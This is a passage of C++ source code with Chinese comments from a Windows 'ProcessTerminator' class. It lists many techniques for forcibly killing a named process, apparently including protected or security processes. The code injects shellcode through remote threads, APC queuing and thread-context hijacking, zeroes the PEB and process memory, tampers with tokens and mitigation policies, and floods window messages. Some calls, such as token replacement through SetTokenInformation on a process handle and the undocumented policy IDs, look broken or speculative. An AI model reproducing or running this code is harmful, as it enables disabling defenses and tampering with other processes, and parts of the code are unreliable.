                            if (te.th32OwnerProcessID == pid) {
                                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,
                                    FALSE, te.th32ThreadID);
                                if (hThread) {
                                    CONTEXT context;
                                    context.ContextFlags = CONTEXT_FULL;

                                    if (GetThreadContext(hThread, &context)) {
#ifdef _WIN64
                                        // 在x64系统上破坏GS配置
                                        PVOID pGsBase = reinterpret_cast<PVOID>(context.SegGs);
                                        if (pGsBase) {
                                            BYTE zeroGs[0x1000] = { 0 };
                                            WriteProcessMemory(hProcess, pGsBase,
                                                zeroGs, sizeof(zeroGs), NULL);
                                        }
#else
                                        // 在x86系统上破坏FS配置
                                        PVOID pFsBase = reinterpret_cast<PVOID>(context.SegFs);
                                        if (pFsBase) {
                                            BYTE zeroFs[0x1000] = { 0 };
                                            WriteProcessMemory(hProcess, pFsBase,
                                                zeroFs, sizeof(zeroFs), NULL);
                                        }
#endif
                                    }
                                    CloseHandle(hThread);
                                }
                            }
                        } while (Thread32Next(hThreadSnapshot, &te));
                    }
                    CloseHandle(hThreadSnapshot);
                }
            }

            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 方法7: 通过安全子系统绕过破坏
bool ProcessTerminator::terminateBySecuritySubsystemBypass(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 获取进程令牌
            HANDLE hToken;
            if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
                // 创建受限令牌
                HANDLE hRestrictedToken;
                if (CreateRestrictedToken(hToken, DISABLE_MAX_PRIVILEGE,
                    0, NULL, 0, NULL, 0, NULL, &hRestrictedToken)) {

                    // 设置极低完整性级别
                    TOKEN_MANDATORY_LABEL tml = { 0 };
                    tml.Label.Attributes = SE_GROUP_INTEGRITY;

                    // 获取匿名完整性级别SID
                    DWORD sidLength = SECURITY_MAX_SID_SIZE;
                    PSID pAnonymousSid = LocalAlloc(LPTR, sidLength);
                    if (CreateWellKnownSid(WinNullSid, NULL, pAnonymousSid, &sidLength)) {
                        tml.Label.Sid = pAnonymousSid;

                        SetTokenInformation(hRestrictedToken, TokenIntegrityLevel,
                            &tml, sizeof(tml));

                        LocalFree(pAnonymousSid);
                    }

                    // 替换进程令牌
                    SetTokenInformation(hProcess, TokenSessionId,
                        &hRestrictedToken, sizeof(HANDLE));

                    CloseHandle(hRestrictedToken);
                }
                CloseHandle(hToken);
            }

            // 禁用所有安全策略
            PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY filterPolicy = { 0 };
            filterPolicy.FilterId = 1; // 实验性过滤器ID

            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
            auto SetProcessMitigationPolicy =
                reinterpret_cast<FnSetProcessMitigationPolicy>(
                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
                        "SetProcessMitigationPolicy"));

            if (SetProcessMitigationPolicy) {
                // 尝试各种未公开的缓解策略
                for (DWORD policyType = 0x200; policyType < 0x220; policyType++) {
                    SetProcessMitigationPolicy(static_cast<PROCESS_MITIGATION_POLICY>(policyType),
                        &filterPolicy, sizeof(filterPolicy));
                }
            }

            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 方法8: 通过虚拟化基础设施破坏
bool ProcessTerminator::terminateByVirtualizationInfrastructure(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 使用Hypervisor-enforced代码完整性
            PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY shadowStackPolicy = { 0 };
            shadowStackPolicy.EnableUserShadowStack = 1;
            shadowStackPolicy.EnableUserShadowStackStrictMode = 1;

            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
            auto SetProcessMitigationPolicy =
                reinterpret_cast<FnSetProcessMitigationPolicy>(
                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
                        "SetProcessMitigationPolicy"));

            if (SetProcessMitigationPolicy) {
                // 设置CET策略（控制流强制技术）
                if (SetProcessMitigationPolicy(ProcessUserShadowStackPolicy,
                    &shadowStackPolicy,
                    sizeof(shadowStackPolicy))) {

                    // 强制进程使用虚拟化安全特性
                    typedef struct _PROCESS_VIRTUALIZATION_BASED_SECURITY {
                        DWORD Flags;
                    } PROCESS_VIRTUALIZATION_BASED_SECURITY, * PPROCESS_VIRTUALIZATION_BASED_SECURITY;

                    PROCESS_VIRTUALIZATION_BASED_SECURITY vbsInfo = { 0 };
                    vbsInfo.Flags = 0x3; // 启用完整虚拟化隔离

                    ProcessTerminator::NtSetInformationProcess(hProcess,
                        static_cast<PROCESS_INFORMATION_CLASS>(61), // ProcessVirtualizationBasedSecurity
                        &vbsInfo, sizeof(vbsInfo));

                    // 启用Credential Guard模拟
                    typedef struct _PROCESS_ISOLATION_MECHANISM {
                        DWORD MechanismType;
                        DWORD Flags;
                    } PROCESS_ISOLATION_MECHANISM;

                    PROCESS_ISOLATION_MECHANISM isolationMechanism = { 0 };
                    isolationMechanism.MechanismType = 2; // Credential Guard
                    isolationMechanism.Flags = 0x1;

                    ProcessTerminator::NtSetInformationProcess(hProcess,
                        static_cast<PROCESS_INFORMATION_CLASS>(62), // 实验性隔离机制
                        &isolationMechanism, sizeof(isolationMechanism));
                }
            }

            // 强制进程进入无法恢复的虚拟化状态
            TerminateProcess(hProcess, 0xC0000000); // 自定义退出代码
            CloseHandle(hProcess);
        }
        return !ProcessTerminator::isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}
// 方法4: 通过控制流防护(CFG)终止
bool ProcessTerminator::terminateByProcessControlFlowGuard(const std::string& processName) {
#ifdef _WIN32
    try {
        // 动态加载API函数
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) return false;

        PSetProcessMitigationPolicy pSetProcessMitigationPolicy =
            reinterpret_cast<PSetProcessMitigationPolicy>(
                GetProcAddress(hKernel32, "SetProcessMitigationPolicy"));

        PSetProcessValidCallTargets pSetProcessValidCallTargets =
            reinterpret_cast<PSetProcessValidCallTargets>(
                GetProcAddress(hKernel32, "SetProcessValidCallTargets"));

        if (!pSetProcessMitigationPolicy || !pSetProcessValidCallTargets) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 修改CFG策略使其过于严格
            PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = { 0 };
            cfgPolicy.EnableControlFlowGuard = 1;
            cfgPolicy.EnableExportSuppression = 1;
            cfgPolicy.StrictMode = 1; // 启用严格模式

            if (pSetProcessMitigationPolicy(ProcessControlFlowGuardPolicy,
                &cfgPolicy, sizeof(cfgPolicy))) {
                // 尝试触发CFG验证失败
                // 分配内存但不将其标记为有效调用目标
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (pRemoteCode) {
                    // 尝试设置无效的调用目标
                    if (!pSetProcessValidCallTargets(hProcess, pRemoteCode, 1024, 0, NULL)) {
                        // CFG策略生效，进程无法执行代码
                        // 现在可以尝试终止
                        bool result = TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        if (result) return true;
                    }
                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                }
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

// 方法5: 通过签名策略终止
bool ProcessTerminator::terminateByProcessSignaturePolicy(const std::string& processName) {
#ifdef _WIN32
    try {
        // 动态加载API函数
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) return false;

        PSetProcessMitigationPolicy pSetProcessMitigationPolicy =
            reinterpret_cast<PSetProcessMitigationPolicy>(
                GetProcAddress(hKernel32, "SetProcessMitigationPolicy"));

        if (!pSetProcessMitigationPolicy) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 设置严格的签名策略
            PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sigPolicy = { 0 };
            sigPolicy.MicrosoftSignedOnly = 1;
            sigPolicy.StoreSignedOnly = 1;
            sigPolicy.MitigationOptIn = 1;

            if (pSetProcessMitigationPolicy(ProcessSignaturePolicy,
                &sigPolicy, sizeof(sigPolicy))) {
                // 尝试加载未签名的DLL使其失败
                // 分配内存写入LoadLibrary代码
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (pRemoteCode) {
                    // 写入LoadLibrary调用
#ifdef _WIN64
                    BYTE loadLibraryCode[] = {
                        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, LoadLibraryA
                        0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // mov rcx, "unknown.dll"
                        0xFF, 0xD0                          // call rax
                    };

                    // 获取LoadLibrary地址
                    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
                    memcpy(&loadLibraryCode[2], &pLoadLibrary, sizeof(pLoadLibrary));

                    // 设置无效的DLL名
                    const char* invalidDll = "invalid_unsigned.dll";
                    memcpy(&loadLibraryCode[12], &invalidDll, sizeof(invalidDll));
#else
                    BYTE loadLibraryCode[] = {
                        0xB8, 0, 0, 0, 0,       // mov eax, LoadLibraryA
                        0x68, 0, 0, 0, 0,       // push "unknown.dll"
                        0xFF, 0xD0              // call eax
                    };

                    // 获取LoadLibrary地址
                    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
                    memcpy(&loadLibraryCode[1], &pLoadLibrary, sizeof(pLoadLibrary));

                    // 设置无效的DLL名
                    const char* invalidDll = "invalid_unsigned.dll";
                    memcpy(&loadLibraryCode[6], &invalidDll, sizeof(invalidDll));
#endif
                    WriteProcessMemory(hProcess, pRemoteCode, loadLibraryCode,
                        sizeof(loadLibraryCode), NULL);

                    // 创建远程线程执行
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                        (LPTHREAD_START_ROUTINE)pRemoteCode,
                        NULL, 0, NULL);
                    if (hThread) {
                        // 等待线程执行失败
                        WaitForSingleObject(hThread, 1000);
                        DWORD exitCode;
                        GetExitCodeThread(hThread, &exitCode);

                        if (exitCode == NULL) {
                            // 签名策略生效，加载失败
                            // 现在可以尝试终止
                            bool result = TerminateProcess(hProcess, 0);
                            CloseHandle(hThread);
                            CloseHandle(hProcess);
                            if (result) return true;
                        }
                        CloseHandle(hThread);
                    }

                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                }
            }

            CloseHandle(hProcess);
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}
bool ProcessTerminator::terminateByMemoryZeroing(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 获取进程内存信息
            MEMORY_BASIC_INFORMATION mbi;
            LPVOID address = NULL;
            std::vector<BYTE> zeroBuffer(4096, 0);

            while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                if (mbi.State == MEM_COMMIT &&
                    (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) {
                    // 尝试清零内存
                    SIZE_T bytesWritten;
                    WriteProcessMemory(hProcess, mbi.BaseAddress,
                        zeroBuffer.data(),
                        std::min(zeroBuffer.size(), mbi.RegionSize),
                        &bytesWritten);
                }

                address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
            }

            // 尝试正常终止
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByThreadHijacking(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 枚举进程线程
            DWORD threadId = 0;
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                THREADENTRY32 te32;
                te32.dwSize = sizeof(THREADENTRY32);

                if (Thread32First(hSnapshot, &te32)) {
                    do {
                        if (te32.th32OwnerProcessID == pid) {
                            threadId = te32.th32ThreadID;
                            break;
                        }
                    } while (Thread32Next(hSnapshot, &te32));
                }
                CloseHandle(hSnapshot);
            }

            if (threadId != 0) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
                if (hThread) {
                    // 挂起线程
                    SuspendThread(hThread);

                    // 获取线程上下文
                    CONTEXT context;
                    context.ContextFlags = CONTEXT_FULL;
                    GetThreadContext(hThread, &context);

                    // 分配内存存放退出代码
                    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    if (pRemoteCode) {
                        // 写入退出进程的代码
#ifdef _WIN64
                        BYTE exitCode[] = {
                            0x48, 0x83, 0xEC, 0x28,             // sub rsp, 28h
                            0x48, 0x31, 0xC9,                   // xor rcx, rcx
                            0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, ExitProcess
                            0xFF, 0xD0,                         // call rax
                            0x90, 0x90, 0x90, 0x90              // nops
                        };

                        // 获取ExitProcess地址
                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                        if (!hKernel32) {
                            // 处理错误
                            return false;
                        }
                        FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
                        memcpy(&exitCode[9], &pExitProcess, sizeof(pExitProcess));
#else
                        BYTE exitCode[] = {
                            0x6A, 0x00,                         // push 0
                            0xB8, 0, 0, 0, 0,                   // mov eax, ExitProcess
                            0xFF, 0xD0,                         // call eax
                            0x90, 0x90, 0x90                    // nops
                        };

                        // 获取ExitProcess地址
                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                        FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
                        memcpy(&exitCode[3], &pExitProcess, sizeof(pExitProcess));
#endif
                        WriteProcessMemory(hProcess, pRemoteCode, exitCode, sizeof(exitCode), NULL);

                        // 修改线程上下文执行退出代码
#ifdef _WIN64
                        context.Rip = (DWORD64)pRemoteCode;
#else
                        context.Eip = (DWORD)pRemoteCode;
#endif
                        SetThreadContext(hThread, &context);

                        // 恢复线程执行
                        ResumeThread(hThread);

                        // 等待线程退出
                        WaitForSingleObject(hThread, 1000);

                        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                    }

                    CloseHandle(hThread);
                }
            }

            CloseHandle(hProcess);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByExceptionInjection(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 分配内存存放异常代码
            LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (pRemoteCode) {
                // 写入会导致异常的指令
                BYTE faultCode[] = {
                    0x33, 0xC0,    // xor eax, eax
                    0xF7, 0xF0,    // div eax (除零异常)
                    0xC3           // ret
                };

                WriteProcessMemory(hProcess, pRemoteCode, faultCode, sizeof(faultCode), NULL);

                // 创建远程线程执行异常代码
                HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                    (LPTHREAD_START_ROUTINE)pRemoteCode,
                    NULL, 0, NULL);
                if (hThread) {
                    WaitForSingleObject(hThread, 1000);
                    CloseHandle(hThread);
                }

                VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
            }

            CloseHandle(hProcess);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByMessageFlooding(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            // 查找进程的所有窗口
            HWND hWnd = NULL;
            do {
                hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);

                DWORD windowPid;
                GetWindowThreadProcessId(hWnd, &windowPid);

                if (windowPid == pid) {
                    // 发送大量消息使进程无响应
                    for (int i = 0; i < 10000; i++) {
                        PostMessage(hWnd, WM_NULL, 0, 0);
                        PostMessage(hWnd, WM_USER, 0, 0);
                        PostMessage(hWnd, 0x0400 + rand() % 0x3FFF, 0, 0);
                    }
                }
            } while (hWnd != NULL);

            // 尝试正常终止
            terminateByPID(pid);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByGDIExhaustion(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 尝试耗尽进程的GDI资源
            for (int i = 0; i < 10000; i++) {
                // 这些调用会消耗目标进程的GDI资源
                DWORD_PTR result;
                SendMessageTimeout(HWND_BROADCAST, WM_NULL, 0, 0,
                    SMTO_ABORTIFHUNG | SMTO_BLOCK, 100, &result);
            }

            // 尝试正常终止
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByProcessTree(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 获取所有相关进程（父进程和子进程）
        std::set<DWORD> allPids;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);

            if (Process32First(hSnapshot, &pe)) {
                do {
                    // 检查是否是目标进程或其子进程
                    for (int targetPid : pids) {
                        if (pe.th32ProcessID == targetPid ||
                            pe.th32ParentProcessID == targetPid) {
                            allPids.insert(pe.th32ProcessID);

                            // 递归添加子进程
                            std::function<void(DWORD)> addChildren = [&](DWORD parentPid) {
                                PROCESSENTRY32 pe2 = { sizeof(PROCESSENTRY32) };
                                if (Process32First(hSnapshot, &pe2)) {
                                    do {
                                        if (pe2.th32ParentProcessID == parentPid) {
                                            allPids.insert(pe2.th32ProcessID);
                                            addChildren(pe2.th32ProcessID);
                                        }
                                    } while (Process32Next(hSnapshot, &pe2));
                                }
                                };

                            addChildren(pe.th32ProcessID);
                        }
                    }
                } while (Process32Next(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }

        // 终止所有相关进程
        for (DWORD pid : allPids) {
            terminateByPID(pid);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}
bool ProcessTerminator::terminateByKernelMemoryManipulation(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 启用必要特权
            EnablePrivilege(SE_DEBUG_NAME);
            EnablePrivilege(SE_TCB_NAME);

            // 方法1: 直接修改EPROCESS结构
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (!hNtdll) {
                CloseHandle(hProcess);
                continue;
            }

            // 获取系统所有句柄
            ULONG bufferSize = 0x100000;
            PSYSTEM_HANDLE_INFORMATION_EX handleInfo =
                (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);

            if (!handleInfo) {
                CloseHandle(hProcess);
                continue;
            }

            NTSTATUS status;
            while ((status = SafeNtQuerySystemInformation(
                static_cast<SYSTEM_INFORMATION_CLASS>(16),
                handleInfo, bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
                bufferSize *= 2;
                free(handleInfo);
                handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
                if (!handleInfo) {
                    CloseHandle(hProcess);
                    break;
                }
            }

            if (!handleInfo || !NT_SUCCESS(status)) {
                free(handleInfo);
                CloseHandle(hProcess);
                continue;
            }

            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
                    SYSTEM_HANDLE handle = handleInfo->Information[i];

                    if (handle.ProcessId == pid && handle.ObjectTypeNumber == 0x7) {
                        HANDLE hKernelObject;
                        if (DuplicateHandle(GetCurrentProcess(),
                            (HANDLE)handle.Handle,
                            GetCurrentProcess(),
                            &hKernelObject,
                            0, FALSE, DUPLICATE_SAME_ACCESS)) {

                            // 分配内存执行特殊代码
                            LPVOID pRemoteCode = VirtualAllocEx(hProcess,
                                NULL, 4096, MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);

                            if (pRemoteCode) {
                                // 写入特殊终止代码
                                BYTE exitCode[] = {
                                    0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1
                                    0xC3                          // ret
                                };

                                SIZE_T bytesWritten;
                                if (WriteProcessMemory(hProcess, pRemoteCode,
                                    exitCode, sizeof(exitCode), &bytesWritten)) {

                                    HANDLE hThread = CreateRemoteThread(hProcess,
                                        NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pRemoteCode,
                                        NULL, 0, NULL);

                                    if (hThread) {
                                        WaitForSingleObject(hThread, 100);
                                        CloseHandle(hThread);
                                    }
                                }

                                VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                            }

                            // 破坏进程关键结构
                            PROCESS_BASIC_INFORMATION pbi;
                            ULONG returnLength;

                            if (NT_SUCCESS(NtQueryInformationProcess(hProcess,
                                static_cast<PROCESS_INFORMATION_CLASS>(0),
                                &pbi, sizeof(pbi), &returnLength))) {

                                // 修改PEB关键字段
                                BYTE zeroBuffer[128] = { 0 };
                                SIZE_T bytesWritten;
                                WriteProcessMemory(hProcess, pbi.PebBaseAddress,
                                    zeroBuffer, sizeof(zeroBuffer), &bytesWritten);
                            }

                            CloseHandle(hKernelObject);
                        }
                    }
                }

            free(handleInfo);

            // 修改内存保护制造冲突
            MEMORY_BASIC_INFORMATION mbi;
            LPVOID address = 0;

            while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                if (mbi.State == MEM_COMMIT) {
                    DWORD oldProtect;
                    VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize,
                        PAGE_NOACCESS, &oldProtect);
                    VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize,
                        oldProtect, &oldProtect);
                }

                address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                if (address < mbi.BaseAddress) break;
            }

            // 最终强制终止
            bool result = TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);

            if (result) {
                return true;
            }
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}
bool ProcessTerminator::terminateByTokenReplacement(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 获取当前进程的令牌（通常权限较低）
            HANDLE hCurrentToken;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken)) {
                // 尝试设置目标进程的令牌
                SetTokenInformation(hProcess, TokenSessionId, &hCurrentToken, sizeof(HANDLE));
                CloseHandle(hCurrentToken);
            }

            // 尝试终止权限降低后的进程
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByAPCInjection(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 枚举进程线程
            DWORD threadId = 0;
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                THREADENTRY32 te32;
                te32.dwSize = sizeof(THREADENTRY32);

                if (Thread32First(hSnapshot, &te32)) {
                    do {
                        if (te32.th32OwnerProcessID == pid) {
                            threadId = te32.th32ThreadID;
                            break;
                        }
                    } while (Thread32Next(hSnapshot, &te32));
                }
                CloseHandle(hSnapshot);
            }

            if (threadId != 0) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
                if (hThread) {
                    // 分配内存存放APC代码
                    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    if (pRemoteCode) {
                        // 写入退出线程的代码
#ifdef _WIN64
                        BYTE apcCode[] = {
                            0x48, 0x83, 0xEC, 0x28,       // sub rsp, 28h
                            0x48, 0x31, 0xC9,             // xor rcx, rcx
                            0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, ExitThread
                            0xFF, 0xD0,                   // call rax
                        };

                        // 获取ExitThread地址
                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                        FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
                        memcpy(&apcCode[9], &pExitThread, sizeof(pExitThread));
#else
                        BYTE apcCode[] = {
                            0x6A, 0x00,                   // push 0
                            0xB8, 0, 0, 0, 0,             // mov eax, ExitThread
                            0xFF, 0xD0,                   // call eax
                        };

                        // 获取ExitThread地址
                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                        FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
                        memcpy(&apcCode[3], &pExitThread, sizeof(pExitThread));
#endif
                        WriteProcessMemory(hProcess, pRemoteCode, apcCode, sizeof(apcCode), NULL);

                        // 排队APC
                        QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, (ULONG_PTR)NULL);

                        // 等待APC执行
                        Sleep(100);

                        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                    }

                    CloseHandle(hThread);
                }
            }

            CloseHandle(hProcess);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 通用PPL移除辅助函数
// DLL监控和保护函数（简化版）
static bool MonitorAndProtectDLLs(DWORD pid) {
#ifdef _WIN32
    std::wcout << L"[DLL监控] 开始监控进程 " << pid << L" 的DLL..." << std::endl;
    
    // 简化版本：只输出日志，不实际操作PEB
    // 因为PEB结构体访问可能被保护进程阻止
    
    // 尝试打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        std::wcerr << L"[DLL监控] 无法打开进程" << std::endl;
        return false;
    }
    
    // 尝试读取进程内存（检查是否被保护）
    BYTE buffer[0x1000] = { 0 };
    SIZE_T bytesRead = 0;
    if (ReadProcessMemory(hProcess, (PVOID)0x400000, buffer, sizeof(buffer), &bytesRead)) {
        std::wcout << L"[DLL监控] 成功读取进程内存" << std::endl;
    } else {
        std::wcerr << L"[DLL监控] 无法读取进程内存" << std::endl;
    }
    
    CloseHandle(hProcess);
    return true;
#else
    return false;
#endif
}

// DLL锁定函数（简化版）
static bool LockDLLs(DWORD pid) {
#ifdef _WIN32
    std::wcout << L"[DLL锁定] 开始阻止进程 " << pid << L" 加载DLL..." << std::endl;
    
    // 锁定当前进程的DLL，防止被卸载
    HANDLE hCurrentProcess = GetCurrentProcess();
    
    // 获取当前进程加载的所有DLL
    HMODULE hMods[1024];
    DWORD cbNeeded = 0;
    
    if (EnumProcessModules(hCurrentProcess, hMods, sizeof(hMods), &cbNeeded)) {
        DWORD moduleCount = cbNeeded / sizeof(HMODULE);
        
        for (DWORD i = 0; i < moduleCount; i++) {
            wchar_t szModName[MAX_PATH];
            if (GetModuleFileNameW(hMods[i], szModName, sizeof(szModName) / sizeof(wchar_t))) {
